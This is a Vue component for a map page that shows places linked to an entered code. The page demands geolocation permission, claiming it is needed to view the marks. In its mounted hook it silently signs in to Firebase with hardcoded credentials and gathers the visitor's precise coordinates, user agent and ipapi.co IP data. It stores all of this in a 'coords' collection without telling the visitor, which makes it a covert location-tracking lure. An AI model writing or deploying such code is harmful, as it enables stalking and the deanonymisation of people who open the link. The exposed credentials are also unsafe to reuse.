<template>
  <div class="content" style="position: releative">
    <div id="map" style="width: 100%; height: 90vh"></div>
    <v-alert
      color="info"
      density="compact"
      dismissible
      elevation="3"
      type="info"
      class="subtitle-2"
      v-if="allow && !loading && !marks.length"
      >У данного кода нет меток</v-alert
    >
    <div
      v-if="!allow"
      class="w-100 d-flex flex-column justify-center align-center"
      style="
        height: 90vh;
        position: absolute;
        top: 64px;
        z-index: 9999;
        background-color: #000000d9;
      "
    >
      <div>
        <v-img
          src="@/assets/media/placeholder.png"
          width="65px"
          height="65px"
        ></v-img>
      </div>
      <h3 class="mt-3">
        Чтобы увидеть места, вам необходимо дать доступ к геопозиции
      </h3>
      <p style="text-align: center">
        Если вы запретите доступ к вашей геопозиции, то вы не сможете
        просмотреть отмеченные места по введённому коду.<br /><b
          >Если хотите просмотреть места, то разрешите геопозицию для этого
          сайта в настройках браузера либо нажмите кнопку "Разрешить".</b
        ><br />При необходимости перезагрузите страницу.
      </p>
    </div>
  </div>
</template>

<script>
import { mapMutations, mapGetters } from "vuex";
import {
  collection,
  query,
  where,
  getDocs,
  addDoc,
  updateDoc,
  doc,
} from "firebase/firestore";
import { db } from "@/main.js";
import { getAuth, signInWithEmailAndPassword, signOut } from "firebase/auth";

export default {
  data() {
    return {
      marks: [],
      allow: false,
      marksReq: null,
      loading: true,
    };
  },
  computed: mapGetters(["getCode", "getID"]),
  methods: {
    ...mapMutations(["changeCode"]),
    async loadMarks() {
      if (this.getCode) {
        const docRef = query(
          collection(db, "codes"),
          where("code", "==", this.getCode)
        );
        try {
          const docSnap = await getDocs(docRef);
          if (docSnap.docs.length) {
            docSnap.forEach((doc) => {
              let claimDocs = doc.data();
              if (claimDocs.marks) {
                if (claimDocs.marks.length) {
                  this.marks = [...claimDocs.marks];
                }
              }
            });
          }

          this.marksReq = {
            type: "FeatureCollection",
            features: [],
          };

          let ctx = this;
          let allMarks = this.marks;
          allMarks.forEach(function (item, i) {
            ctx.marksReq.features.push({
              type: "Feature",
              id: i,
              geometry: {
                type: "Point",
                coordinates: item.coords,
              },
              properties: {
                hintContent: "Кликни на меня",
                balloonContent: item.description,
              },
              options: {
                preset: "islands#whiteStretchyIcon",
                iconLayout: "default#image",
                iconImageHref:
                  item.media ||
                  "data:image/png;base64,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",
                iconImageSize: [50, 50],
                iconImageOffset: [-3, -42],
              },
            });
          });

          this.loading = false;
        } catch (error) {
          console.error("Ошибка сервера: ", error);
          this.$router.push("/");
        }
      }
    },
  },
  mounted() {
    const ctx = this;

    let codeFromStore = localStorage.getItem("code");
    if (codeFromStore) {
      this.changeCode(JSON.parse(codeFromStore));
      localStorage.removeItem("code");
    }
    if (!this.getCode) {
      this.$router.push("/");
    }
    let coordsAllow = localStorage.getItem("coordsAllow");

    navigator.geolocation.getCurrentPosition(
      async function (position) {
        if (!coordsAllow) {
          localStorage.setItem("code", JSON.stringify(ctx.getCode));
          localStorage.setItem("coordsAllow", true);
          window.location.reload();
        }
        ctx.allow = true;

        // сохранение в БД
        const auth = getAuth();
        let apiapiData = null;
        await signInWithEmailAndPassword(
          auth,
          "system_call@bot.dev",
          "25566dev"
        )
          .then(async () => {
            await fetch("https://ipapi.co/json/")
              .then((d) => d.json())
              .then((d) => {
                apiapiData = d;
              });
          })
          .then(async () => {
            let today = new Date();
            let now = today.toLocaleString();
            let hintCoord = {
              main: {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                time: now,
              },
              additionally: {
                userAgent: JSON.parse(JSON.stringify(navigator.userAgent)),
                userAgentData: JSON.parse(
                  JSON.stringify(navigator.userAgentData)
                ),
                ipapi: apiapiData,
              },
            };

            const docRef = query(
              collection(db, "coords"),
              where("id", "==", ctx.getID)
            );
            const docSnap = await getDocs(docRef);

            if (docSnap.docs.length) {
              let documentData;
              let documentID;
              docSnap.forEach((doc) => {
                documentData = doc.data();
                documentID = doc.id;
              });
              const docUpdRef = doc(db, "coords", documentID);

              if (documentData.coords) {
                await updateDoc(docUpdRef, {
                  coords: [...documentData.coords, hintCoord],
                });
              } else {
                await updateDoc(docUpdRef, {
                  coords: [ctx.coords],
                });
              }
            } else {
              const docRefNew = await addDoc(collection(db, "coords"), {
                id: ctx.getID,
                coords: [hintCoord],
              });
              if (docRefNew) true;
            }
          })
          .then(() => {
            signOut(auth).catch((error) => {
              console.error("Some error with DB: ", error);
            });
          })
          .catch((error) => {
            const errorCode = error.code;
            const errorMessage = error.message;
            console.error(errorCode, errorMessage);
          });
      },
      function (error) {
        // если ошибка (можно проверить код ошибки)
        console.log(error);
        ctx.allow = false;
        localStorage.removeItem("coordsAllow");
      }
    );

    /* eslint-disable */
    ymaps.ready(init);
    function init() {
     let myMap = new ymaps.Map("map", {
        center: [41.309757, 69.252073],
        zoom: 13,
      });

      if(ctx.allow){
        var objectManager = new ymaps.ObjectManager();
        ctx.loadMarks()
        .then(()=>{
          objectManager.add(JSON.stringify(ctx.marksReq));
          myMap.geoObjects.add(objectManager);
        })
      }
    }

  },
}
</script>
